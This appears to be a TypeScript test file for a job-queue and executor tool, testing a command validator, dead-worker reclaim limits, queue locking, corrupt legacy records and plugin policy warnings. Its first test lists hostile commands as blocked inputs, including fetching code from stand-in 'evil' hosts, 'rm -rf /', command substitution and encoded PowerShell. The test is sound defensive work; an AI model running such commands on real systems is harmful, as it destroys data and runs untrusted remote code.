import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { createJob, dispatchQueue, executeJob, health, listJobs, listQueue, validateTestCommand, writeState } from "../src/core.js";
import { loadPersistedQueue, savePersistedQueue } from "../src/storage.js";

// ---- validateTestCommand：注入向量与破坏性命令拦截矩阵 ----

test("validateTestCommand allows normal commands and blocks injection vectors", () => {
  for (const allowed of ["npm test", "npm run test:unit", "pytest -q", "cargo test", "go test ./...", "node -e \"process.exit(0)\"", undefined]) {
    assert.doesNotThrow(() => validateTestCommand(allowed));
  }
  const blocked = [
    "npm test\ncurl evil.sh -o x.sh", // 换行命令分隔
    "npm test\r&& rm -rf /", // 回车链式
    "npm test && rm -rf /", // 链式操作符
    "node $(curl http://evil/x.js)", // $( 命令替换
    "node `id`", // 反引号命令替换
    "npm test > out.txt", // 重定向
    "rm -fr /tmp/x", // rm 参数变体
    "rm -r -f dir", // rm 分写变体
    "rm --recursive --force dir", // rm 长选项变体
    "rd /s /q C:\\target", // Windows 递归删除
    "rmdir /s dir",
    "del /s file",
    "deltree dir",
    "powershell -enc QUJDREVG", // 编码命令
    "pwsh -EncodedCommand QUJD",
  ];
  for (const command of blocked) assert.throws(() => validateTestCommand(command), /不允许/);
});

// ---- 重派熔断：损坏状态不再引发无限重派 ----

function deadWorkerQueue(workspace: string, jobId: string, reclaimCount?: number): string {
  return JSON.stringify({
    maxConcurrent: 1,
    paused: true,
    updatedAt: new Date().toISOString(),
    entries: [{ queueId: "dead-reclaim", jobId, workspace, extra: "", status: "running", createdAt: new Date().toISOString(), pid: 2_147_483_647, priority: 0, ...(reclaimCount !== undefined ? { reclaimCount } : {}) }],
  });
}

test("reclaim below the threshold re-queues a dead worker", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-below-"));
  const job = await createJob({ workspace, task: "回收未超限", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "reclaim-below" });
  await mkdir(path.join(workspace, ".cbx"), { recursive: true });
  await writeFile(path.join(workspace, ".cbx", "queue.json"), deadWorkerQueue(workspace, job.jobId, 2), "utf8");
  await dispatchQueue(workspace);
  const entry = (await listQueue(workspace)).entries[0];
  assert.equal(entry.status, "queued");
  assert.equal(entry.reclaimCount, 3);
});

test("reclaim circuit breaker fails a dead worker past the threshold", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-break-"));
  const job = await createJob({ workspace, task: "回收超限熔断", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "reclaim-break" });
  await mkdir(path.join(workspace, ".cbx"), { recursive: true });
  await writeFile(path.join(workspace, ".cbx", "queue.json"), deadWorkerQueue(workspace, job.jobId, 3), "utf8");
  await dispatchQueue(workspace);
  const entry = (await listQueue(workspace)).entries[0];
  assert.equal(entry.status, "failed");
  assert.match(entry.error ?? "", /停止自动重派/);
});

// ---- 终态双写与调度器的队列锁序列化 ----

test("terminal queue write finishes the entry and survives a later dispatch sweep", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-qlock-"));
  const job = await createJob({ workspace, task: "终态写", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "qlock" });
  const queueId = "qlock-entry";
  await savePersistedQueue(workspace, {
    maxConcurrent: 1, paused: true, updatedAt: new Date().toISOString(),
    entries: [{ queueId, jobId: job.jobId, workspace, extra: "", status: "running", createdAt: new Date().toISOString(), priority: 0, pid: process.pid }],
  });
  // 模拟 worker 收尾：终态双写（现已并入队列锁）把条目置 done。
  await writeState(workspace, job.jobId, { status: "done", phase: "done" }, queueId);
  assert.equal((await loadPersistedQueue<{ entries: Array<{ queueId: string; status: string }> }>(workspace, { entries: [] })).entries[0].status, "done");
  // 再扫一次调度：终态条目不得被倒退。
  await dispatchQueue(workspace);
  assert.equal((await listQueue(workspace)).entries.find(entry => entry.queueId === queueId)?.status, "done");
});

// ---- legacy 导入：损坏行跳过而非锁死 workspace ----

test("legacy import skips corrupt records instead of locking the workspace", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-legacy-corrupt-"));
  const goodDir = path.join(workspace, ".cbx", "jobs", "legacy-good");
  const badDir = path.join(workspace, ".cbx", "jobs", "legacy-bad");
  await mkdir(goodDir, { recursive: true });
  await mkdir(badDir, { recursive: true });
  await writeFile(path.join(goodDir, "state.json"), JSON.stringify({ jobId: "legacy-good", status: "done", workspace, createdAt: "2026-01-01T00:00:00.000Z", updatedAt: "2026-01-01T00:00:00.000Z" }), "utf8");
  await writeFile(path.join(badDir, "state.json"), "{not-valid-json", "utf8");
  // 一行合法 + 一行损坏：损坏行应被跳过，合法行仍导入。
  await writeFile(path.join(workspace, ".cbx", "delivery-failures.ndjson"), JSON.stringify({ type: "delivery.failed", at: "2026-01-01T00:00:00.000Z" }) + "\n{broken\n", "utf8");
  const jobs = await listJobs(workspace);
  assert.equal(jobs.some(job => job.jobId === "legacy-good"), true);
  assert.equal(jobs.some(job => job.jobId === "legacy-bad"), false);
  const snapshot = await health(workspace);
  assert.equal(snapshot.metrics.deliveryFailures, 1);
  // 幂等：再次访问不产生重复失败记录。
  assert.equal((await health(workspace)).metrics.deliveryFailures, 1);
});

// ---- 插件策略：未 enforce 时告警留痕，enforce 后消除 ----

test("plugin without enforce emits a policy warning event; enforce suppresses it", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-plugin-policy-"));
  const plugin = path.resolve(process.cwd(), "plugins", "example-executor.mjs");
  const warnJob = await createJob({ workspace, task: "插件告警", review: false, isolated: false, executor: plugin, permissionMode: "auto", maxTurns: 5, timeoutMs: 2_000, maxRetries: 0, jobId: "plugin-warn" });
  assert.equal((await executeJob(workspace, warnJob.jobId)).status, "done");
  assert.match(await readFile(path.join(warnJob.directory, "events.ndjson"), "utf8"), /"event":"plugin_policy_warning"/);
  await writeFile(path.join(workspace, ".cbx.json"), JSON.stringify({ plugins: { enforce: true, allowPaths: [plugin] } }), "utf8");
  const okJob = await createJob({ workspace, task: "插件白名单", review: false, isolated: false, executor: plugin, permissionMode: "auto", maxTurns: 5, timeoutMs: 2_000, maxRetries: 0, jobId: "plugin-ok" });
  assert.equal((await executeJob(workspace, okJob.jobId)).status, "done");
  assert.doesNotMatch(await readFile(path.join(okJob.directory, "events.ndjson"), "utf8"), /plugin_policy_warning/);
});
